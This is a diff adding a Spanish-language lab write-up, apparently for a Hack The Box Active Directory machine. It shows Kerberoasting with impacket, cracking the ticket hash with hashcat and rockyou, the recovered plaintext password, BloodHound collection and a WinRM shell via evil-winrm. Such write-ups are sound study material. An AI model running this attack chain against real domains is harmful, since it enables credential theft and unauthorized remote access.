@@ -544,6 +544,73 @@ nxc smb DC01.mirage.htb -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' --shares -k
 
 <img width="1920" height="469" alt="image" src="https://github.com/user-attachments/assets/54ed2a88-0887-42b4-a312-15a0ee9b4086" />
 
+testeamos `ldap`
+
+```bash
+nxc ldap DC01.mirage.htb -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -k
+```
+
+<img width="1920" height="469" alt="image" src="https://github.com/user-attachments/assets/db67a21b-e535-4bce-bdd2-60f30f2b8d18" />
+
+vemos que funciona correctamente, ahora vamos a buscar usuarios que lleguen a ser vulnerables a `Kerberoasting`
+
+```bash
+impacket-GetUserSPNs mirage.htb/david.jjackson -no-pass -k -dc-host DC01.mirage.htb -request -outputfile hashes.txt
+```
+
+<img width="1920" height="217" alt="image" src="https://github.com/user-attachments/assets/15b007c4-2379-42ac-b084-116bd0f12994" />
+
+conseguimos un usuario vulnerable asi que procedemos a intentar crackear el hash obtenido
+
+```bash
+hashcat --identify hashes.txt
+```
+
+<img width="1920" height="192" alt="image" src="https://github.com/user-attachments/assets/8f8d1b01-2bcf-47cd-8008-d6c93639d208" />
+
+```bash
+hashcat -m 13100 -a 0 -w 4 -d 1 hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+<img width="1920" height="969" alt="image" src="https://github.com/user-attachments/assets/9667ac03-c1b9-4a00-b760-8138d543b2a8" />
+
+obtenemos la password del usuario `nathan.aadam`
+
+>>> credenciales nathan.aadam:3edc#EDC3
+
+ahora solicitamos un ticket kerberos para este usuario
+
+```bash
+kinit nathan.aadam@MIRAGE.HTB # ingresamos la password cuando la solicite
+```
+
+ahora recolectamos informacion con `bloodhound-python`
+
+```bash
+bloodhound-python -u 'nathan.aadam' -p '3edc#EDC3' -k -d mirage.htb -ns 10.10.11.78 -c ALl --zip
+```
+
+<img width="1920" height="448" alt="image" src="https://github.com/user-attachments/assets/630e6ea1-013e-46d9-ad63-bd95866def05" />
+
+lo exportamos a `bloodhound`
+
+<img width="1920" height="970" alt="image" src="https://github.com/user-attachments/assets/ec18b970-0f38-42cc-a210-ba4460bca620" />
+
+como se observa en el grafico, este usuario pertenece al grupo `REMOTE MANAGEMENT` por lo que podemos acceder via `WinRm`
+
+```bash
+evil-winrm -i DC01.mirage.htb -k -u nathan.aadam -r MIRAGE.HTB
+```
+
+<img width="1920" height="449" alt="image" src="https://github.com/user-attachments/assets/2eab34b4-ad26-443b-ab4f-dd5408eed915" />
+
+
+
+
+
+
+
+
 
 
 
